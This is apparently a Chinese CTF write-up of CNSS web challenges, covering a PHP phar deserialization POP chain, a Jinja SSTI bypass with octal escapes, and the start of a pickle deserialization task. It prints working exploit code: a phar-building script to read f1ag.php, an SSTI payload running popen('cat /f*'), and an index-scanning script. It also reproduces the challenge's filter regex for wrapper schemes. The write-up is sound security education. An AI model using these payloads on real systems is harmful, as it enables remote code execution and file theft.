<h2 id="🔧-where-is-my-unserialize"><a href="#🔧-where-is-my-unserialize" class="headerlink" title="🔧 where is my unserialize?"></a>🔧 where is my unserialize?</h2><p>没有直接提供源码，没有<code>unserialize函数</code>，<code>phar</code>反序列化，太明显了题目<br>还可以查看文件，<code>url/file.php?file=upload_file.php</code>，得到信息<code>function.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>;</span><br><span class="line"><span class="comment">//header(&quot;Content-type: text/html;charset=utf-8&quot;);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功喵!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h4&gt;请选择上传的文件喵:&quot;</span> . <span class="string">&quot;&lt;h4/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><code>base.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;CNSS&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span>&quot; <span class="title">role</span>=&quot;<span class="title">navigation</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;首页&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbra</span>-<span class="title">toggle</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">file</span>.<span class="title">php</span>?<span class="title">file</span>=&quot;&gt;查看文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">upload_file</span>.<span class="title">php</span>&quot;&gt;上传文件&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glyphicon</span> <span class="title">glyphicon</span>-<span class="title">user</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> (&#x27;<span class="title">hello</span>,&#x27;.$<span class="title">_SERVER</span>[&#x27;<span class="title">REMOTE_ADDR</span>&#x27;]);?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--<span class="title">flag</span> <span class="title">is</span> <span class="title">in</span> <span class="title">f1ag</span>.<span class="title">php</span>--&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>不对啊，东西也不够啊，想起了<code>file.php</code>，得到最关键的信息<code>class.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="string">&#x27;cnss&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;shin0 = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shin0.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_get</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;   <span class="comment">//Do you know &#x27;Php ARchive&#x27;?</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://picx.zhimg.com/80/v2-7cac117389557ba335fe0ee1073c4a01_1440w.png" alt=""></p>
<p>首先注意到<code>file_get_contents</code>这个函数，让它作为出口，但是没有输出，使用到<code>CNSS</code>的析构函数(echo)，同时<code>Show</code>的<code>__toString()</code>方法触发<code>CN55</code>的<code>__invoke()</code>方法</p>
<p>本题不会触发<code>__wakeup()</code>，就不用进行绕过了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shin0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CN55</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$haha</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CNSS</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">CN55</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;haha[<span class="string">&#x27;hehe&#x27;</span>]-&gt;params[<span class="string">&#x27;key&#x27;</span>] = <span class="string">&quot;f1ag.php&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>修改为<code>phar.jpg</code>，这个题目坏在不给我们提供文件路径得自己计算<code>md5(phar.jpg)</code>，一开始我还以为没上传成功，就不管这题了<br>后面学弟说要自己算，开始还拿错网站了。。。<br><code>url/file.php?file=phar://upload/628941e623f5a967093007bf39be805f.jpg</code></p>
<p><code>CNSS&#123;Y0u_Kn0w_PHP_v2ry_we1l!&#125;</code><br>考点<code>pop链构造+phar反序列化</code></p>
<h2 id="💻-CNSS娘の聊天室"><a href="#💻-CNSS娘の聊天室" class="headerlink" title="💻 CNSS娘の聊天室"></a>💻 CNSS娘の聊天室</h2><p><code>&#123;&#123;7*7&#125;&#125;，判断是SSTI</code>(默认jinja了，这个太常见了)<br>只把<code>字母</code>ban了，利用八进制绕过</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__.__subclasses__()[<span class="number">133</span>].__init__.__globals__.popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">.__class__ =&gt; [<span class="string">&quot;\137\137\143\154\141\163\163\137\137&quot;</span>]</span><br><span class="line">.__base__ =&gt; [<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>]</span><br><span class="line">.__subclasses__ =&gt; [<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]</span><br><span class="line">.__init__ =&gt; [<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>]</span><br><span class="line">.__globals__ =&gt; [<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>]</span><br><span class="line">.popen =&gt; [<span class="string">&quot;\160\157\160\145\156&quot;</span>]</span><br><span class="line">cat /f* =&gt; <span class="string">&quot;\143\141\164\40\57\146\52&quot;</span></span><br><span class="line">.read =&gt; [<span class="string">&quot;\162\145\141\144&quot;</span>]</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\137\137\143\154\141\163\163\137\137&#x27;</span>][<span class="string">&quot;\137\137\142\141\163\145\137\137&quot;</span>][<span class="string">&quot;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&quot;</span>]()[<span class="number">133</span>][<span class="string">&quot;\137\137\151\156\151\164\137\137&quot;</span>][<span class="string">&quot;\137\137\147\154\157\142\141\154\163\137\137&quot;</span>][<span class="string">&quot;\160\157\160\145\156&quot;</span>](<span class="string">&quot;\143\141\164\40\57\146\52&quot;</span>)[<span class="string">&quot;\162\145\141\144&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1:5000/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p><code>CNSS&#123;y0u_Fxxking_ru1n3d_My_ch4tr00m!&#125;</code></p>
<p>考点<code>无字母八进制绕过SSTI</code></p>
<h2 id="🏪-CNSS娘のFlag商店"><a href="#🏪-CNSS娘のFlag商店" class="headerlink" title="🏪 CNSS娘のFlag商店"></a>🏪 CNSS娘のFlag商店</h2><p><code>main.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> buyInfo</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">flag = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hi</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, money</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.money = money</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.name == other.name <span class="keyword">and</span> self.money == other.money</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = flask.request.args.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;View code in /code to buy flag.&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;R&#x27;</span> <span class="keyword">in</span> user.upper():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;臭要饭的别挡我财路&#x27;</span></span><br><span class="line"></span><br><span class="line">    user = pickle.loads(user.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(user.name, user.money)</span><br><span class="line">    <span class="built_in">print</span>(buyInfo.NAME,  buyInfo.MONEY)</span><br><span class="line">    <span class="keyword">if</span> user == Hi(buyInfo.NAME,  buyInfo.MONEY):</span><br><span class="line">        buyInfo.reset()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;CNSS娘最喜欢富哥啦，这是你要的flag <span class="subst">&#123;flag&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;臭要饭的别挡我财路&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>():</span><br><span class="line">    file = <span class="string">&#x27;code.zip&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.send_file(file, mimetype=<span class="string">&#x27;application/zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>
<p><code>buyInfo.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">MONEY = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    <span class="keyword">global</span> NAME, MONEY</span><br><span class="line">    NAME = <span class="string">&quot;Rich&quot;</span></span><br><span class="line">    MONEY = <span class="number">2000</span></span><br></pre></td></tr></table></figure>
<p>重点是不能出现<code>r R</code>，但又要是<code>Rich</code>，关注到<code>user = pickle.loads(user.encode(&#39;utf-8&#39;))</code>，很明显的<code>pickle</code>反序列化，ban了<code>R指令</code>，<code>__reduce__</code>就无法使用了，类似于<code>PHP</code>中的<code>__wakeup</code>(触发反序列化就自动调用)<br>接下来，手搓<code>opcode</code><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cioi/p/12464592.html">https://www.cnblogs.com/cioi/p/12464592.html</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br><a target="_blank" rel="noopener" href="https://www.kinsomnia.cn/index.php/2023/12/11/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://www.kinsomnia.cn/index.php/2023/12/11/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1782/">https://tttang.com/archive/1782/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a><br><a target="_blank" rel="noopener" href="http://ngc660.cn/2022/11/%E6%9C%80%E8%BF%91%E7%A2%B0%E5%88%B0%E7%9A%84-python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%80%BB%E7%BB%93/">http://ngc660.cn/2022/11/%E6%9C%80%E8%BF%91%E7%A2%B0%E5%88%B0%E7%9A%84-python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%80%BB%E7%BB%93/</a><br>本地试验一下，同时也熟悉一下<code>c o i</code>三种操作码</p>
